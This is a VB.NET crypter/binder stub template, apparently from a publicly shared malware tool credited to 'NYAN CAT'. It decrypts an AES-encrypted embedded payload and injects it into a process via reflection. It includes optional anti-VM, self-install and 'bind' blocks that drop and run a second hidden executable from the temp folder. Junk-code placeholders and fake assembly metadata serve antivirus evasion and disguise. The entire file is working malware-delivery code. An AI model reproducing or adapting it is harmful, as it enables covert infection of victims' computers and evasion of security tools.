'******* https://github.com/NYAN-x-CAT
'******* Credit to NYAN CAT

Imports System, Microsoft.VisualBasic
Imports Microsoft.Win32
Imports System.Windows
Imports System.Windows.Forms
Imports System.Reflection
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO.Compression
Imports System.IO
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Collections
Imports System.Collections.Generic

'%ASSEMBLY%<Assembly: AssemblyTitle("%Title%")> 
'%ASSEMBLY%<Assembly: AssemblyDescription("%Description%")> 
'%ASSEMBLY%<Assembly: AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 
'%ASSEMBLY%<Assembly: Guid("%Guid%")>

%JUNK3%

Public Class Main

    Public Shared Sub Main()

        '@DELAY Threading.Thread.Sleep(#DELAY * 1000)

        '@VM _Voker1(_Method(_Type(_Load(AES.Decrypter(_Resource("#VMdll"))), "VM.Main"), "ST"), Application.ExecutablePath)

        '@INS _Voker1(_Method(_Type(_Load(AES.Decrypter(_Resource("#INSdll"))), "INS.Main"), "ST"), Interaction.Environ("#PATH") + "#EXE")

        '@BIND   Dim T As New Threading.Thread(AddressOf _Bind)
        '@BIND   T.Start()

        _Voker2(_Method(_Type(_Load(AES.Decrypter(_Resource("#PEdll"))), "PE.Main"), "ST"))

    End Sub

    Public Shared Function _Load(ByVal F As Object)
        On Error Resume Next
        Return Reflection.Assembly.Load(F)
    End Function

            %JUNK1%

    Public Shared Function _Type(ByVal L As Reflection.Assembly, ByVal One As String)
        On Error Resume Next
        Dim x = L.GetType(One)
        Return x
    End Function

    Public Shared Function _Method(ByVal T As System.Type, ByVal One As String)
        On Error Resume Next
        Dim x As Reflection.MethodInfo = T.GetMethod(One, Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static)
        Return x
    End Function

    Public Shared Function _Voker1(ByVal M As Reflection.MethodInfo, ByVal One As String)
        On Error Resume Next
        Return M.Invoke(Nothing, New Object() {One})
    End Function

    Public Shared Function _Voker2(ByVal M As Reflection.MethodInfo)
        On Error Resume Next
        M.Invoke(Nothing, New Object() {#INJECT, Nothing, AES.Decrypter((_Resource("#PAYLOAD"))), True})
    End Function

            %JUNK2%


    Public Shared Function _Resource(ByVal Name As String)
        Dim Asm As Reflection.Assembly = Reflection.Assembly.GetExecutingAssembly()
        Dim Res As New Resources.ResourceManager("#ResName", Asm)
        Return Res.GetObject(Name)
    End Function

    '@BIND  Public Shared Sub _Bind()
    '@BIND On Error Resume Next
    '@ONCE If IO.File.Exists(IO.Path.GetTempPath + "#ONCE") Then
    '@ONCE  Exit Sub
    '@ONCE Else
    '@BIND   Dim FN As String = IO.Path.GetTempFileName + ".exe"
    '@BIND     IO.File.WriteAllBytes(FN, AES.Decrypter(_Resource("#BINDdll")))
    '@ONCE      IO.File.Create(IO.Path.GetTempPath + "#ONCE")
    '@BIND       Diagnostics.Process.Start(FN)
    '@ONCE End If
    '@BIND End Sub


End Class


        %JUNK4%


Public Class AES
    Public Shared Function Decrypter(ByVal File As Byte()) As Byte()
        Dim AES As System.Security.Cryptography.RijndaelManaged = New System.Security.Cryptography.RijndaelManaged()
        Dim hash As Byte() = New Byte(31) {}
        Dim temp As Byte() = New Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes("#KEY"))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = System.Security.Cryptography.CipherMode.ECB
        Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor()
        Return DESDecrypter.TransformFinalBlock(File, 0, File.Length)
    End Function
End Class